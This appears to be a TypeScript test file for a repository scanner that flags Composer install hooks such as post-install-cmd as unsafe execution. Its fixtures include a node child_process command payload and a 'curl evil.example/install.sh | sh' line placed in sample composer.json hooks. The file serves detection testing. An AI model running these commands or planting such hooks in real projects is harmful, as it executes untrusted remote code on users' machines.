import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/**
 * A payload only the install-script rules catch: the `child_process` rule is
 * scoped to install content, so a manifest review alone never finds it.
 */
const PAYLOAD = `node -e 'require("child_process").execSync("id > /tmp/slop-pwned")'`;
const DOWNLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function findingSummary(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

test("a Composer install hook is install content, not only manifest content", () => {
  // PRD section 8: the scan checks install scripts. `composer install` runs
  // post-install-cmd on its own, with no plugin and no opt-in.
  const inspection = inspected(
    "composer.json",
    `${JSON.stringify({ name: "evil/demo", scripts: { "post-install-cmd": PAYLOAD } }, null, 2)}\n`,
  );
  // The manifest stays reviewed as a manifest too.
  expect(surfacesOf("composer.json")).toEqual(["manifests", "source"]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(findingSummary(inspection)).toEqual([
    "composer.json#scripts:unsafe-execution:medium",
  ]);
});

test("the download a hook performs is collected as install content", () => {
  const inspection = inspected(
    "composer.json",
    `${JSON.stringify({ scripts: { "post-install-cmd": DOWNLOAD } })}\n`,
  );
  // An unfetched URL opens a visibility gap instead of disappearing.
  expect(inspection.downloads).toContain("https://evil.example/install.sh");
});

test("every automatic Composer event is read, in both value shapes", () => {
  const inspection = inspected(
    "composer.json",
    `${JSON.stringify(
      {
        scripts: {
          "pre-install-cmd": ["echo pre-install", PAYLOAD],
          "post-install-cmd": PAYLOAD,
          "pre-update-cmd": [PAYLOAD],
          "post-update-cmd": PAYLOAD,
          "post-autoload-dump": ["echo dump"],
        },
      },
      null,
      2,
    )}\n`,
  );
  expect(findingSummary(inspection)).toEqual([
    "composer.json#scripts:unsafe-execution:medium",
    "composer.json#scripts:unsafe-execution:medium",
    "composer.json#scripts:unsafe-execution:medium",
    "composer.json#scripts:unsafe-execution:medium",
  ]);
});

test("a Composer manifest without automatic hooks adds no install content", () => {
  const inspection = inspected(
    "composer.json",
    `${JSON.stringify({
      name: "clean/demo",
      scripts: { test: PAYLOAD, "post-create-project-cmd": PAYLOAD },
    })}\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 0,
  });
  expect(inspection.findings).toEqual([]);
});

test("a Composer hook is read at any depth and with any case", () => {
  for (const path of ["Composer.json", "sub/composer.json"]) {
    const inspection = inspected(
      path,
      `${JSON.stringify({ scripts: { "post-install-cmd": PAYLOAD } })}\n`,
    );
    expect({ path, items: inspection.coverage.installScripts.items }).toEqual({
      path,
      items: 1,
    });
  }
});

test("malformed Composer JSON stays a reviewed manifest without hooks", () => {
  const inspection = inspected("composer.json", '{"scripts": {');
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 0,
  });
  expect(inspection.coverage.manifests.items).toBe(1);
});
